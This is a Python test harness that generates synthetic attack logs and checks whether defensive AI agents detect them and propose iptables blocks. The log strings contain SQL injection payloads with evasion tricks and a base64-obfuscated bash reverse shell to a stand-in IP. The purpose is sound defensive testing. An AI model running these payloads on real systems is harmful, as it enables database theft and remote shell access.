import base64
import time
import random
from typing import List, Dict, Any
from state.models import IncidentState, StatusEnum
from agents.log_analyst import LogAnalystAgent
from agents.threat_hunter import ThreatHunterAgent
from agents.incident_responder import IncidentResponderAgent

class RedTeamSimulator:
    """
    Simulates adversarial behavior by generating mutated/obfuscated malicious log entries.
    """

    @staticmethod
    def mutate_sql_injection(attacker_ip: str = "203.0.113.99") -> List[str]:
        timestamp = time.strftime("%d/%b/%Y:%H:%M:%S +0000", time.gmtime())
        # Mutated techniques: Case variation, URL double-encoding, comment evasion
        mutations = [
            "uNiOn sElEcT username, password FROM users",
            "1%2520UNION%2520SELECT%25201,2,3",
            "1'/**/OR/**/1=1/**/--"
        ]
        logs = []
        for payload in mutations:
            logs.append(
                f"nginx[1022]: {attacker_ip} - - [{timestamp}] "
                f"\"GET /search?q={payload} HTTP/1.1\" 200 512 "
                f"\"-\" \"RedTeamBot/1.0\""
            )
        return logs

    @staticmethod
    def mutate_reverse_shell(attacker_ip: str = "198.51.100.200", attacker_port: int = 8080) -> List[str]:
        timestamp = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
        pid = random.randint(20000, 30000)
        
        # Base64 obfuscated reverse shell payload: "bash -i >& /dev/tcp/198.51.100.200/8080 0>&1"
        raw_cmd = f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1"
        b64_payload = base64.b64encode(raw_cmd.encode()).decode()
        obfuscated_cmd = f"echo {b64_payload} | base64 -d | bash"
        
        return [
            f"{timestamp} auditd[{pid}]: type=EXECVE msg=audit(1625573421.321:999): "
            f"argc=3 a0=\"sh\" a1=\"-c\" a2=\"{obfuscated_cmd}\"",
            f"{timestamp} systemd[1]: Process {pid} (bash) spawned interactive shell to remote endpoint {attacker_ip}:{attacker_port}"
        ]

    @classmethod
    def generate_attack_stream(cls, attack_type: str, attacker_ip: str) -> List[str]:
        """
        Creates a list of logs simulating a specific obfuscated attack.
        """
        logs = []
        # Add normal background noise
        timestamp = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
        logs.append(f"{timestamp} systemd-logind[452]: New session 12 of user debian-sys-maint.")
        
        if attack_type == "sql_injection":
            logs.extend(cls.mutate_sql_injection(attacker_ip))
        elif attack_type == "reverse_shell":
            logs.extend(cls.mutate_reverse_shell(attacker_ip))
            
        logs.append(f"{timestamp} postfix/qmgr[1220]: A8FCE4031B: removed")
        return logs


class AdversarialEvaluator:
    """
    Runs adversarial simulation loops and validates defense agent responses.
    """

    def __init__(self):
        self.analyst = LogAnalystAgent()
        self.hunter = ThreatHunterAgent()
        self.responder = IncidentResponderAgent()

    async def evaluate_run(self, attack_type: str, attacker_ip: str) -> Dict[str, Any]:
        """
        Runs a simulation iteration: generates mutated logs, passes them through the AegisHunt
        agents, and validates that containment actions target the correct assets.
        """
        # Generate the malicious log stream
        logs = RedTeamSimulator.generate_attack_stream(attack_type, attacker_ip)
        
        # Initialize central state
        state = IncidentState(raw_logs=logs)
        
        # Execute multi-agent pipeline
        state = await self.analyst.process(state)
        state = await self.hunter.process(state)
        state = await self.responder.process(state)
        
        # Validation checks
        mitigation_rules = state.mitigation_plan
        is_blocked = False
        target_rule = ""

        if attack_type == "sql_injection":
            # Check if there is an iptables rule blocking the SQL injection attacker IP
            expected_cmd = f"iptables -A INPUT -s {attacker_ip} -j DROP"
            is_blocked = expected_cmd in mitigation_rules
            target_rule = expected_cmd
        elif attack_type == "reverse_shell":
            # Check if there is a rule blocking output to the C2 IP
            expected_cmd = f"iptables -A OUTPUT -d {attacker_ip} -j DROP"
            is_blocked = expected_cmd in mitigation_rules
            target_rule = expected_cmd

        passed = is_blocked and len(state.detected_anomalies) > 0

        return {
            "attack_type": attack_type,
            "attacker_ip": attacker_ip,
            "logs_analyzed": len(logs),
            "anomalies_detected": len(state.detected_anomalies),
            "severity_score": state.severity_score.value,
            "mitigation_plan": state.mitigation_plan,
            "execution_status": state.execution_status.value,
            "expected_remediation_rule": target_rule,
            "evaluation_passed": passed
        }
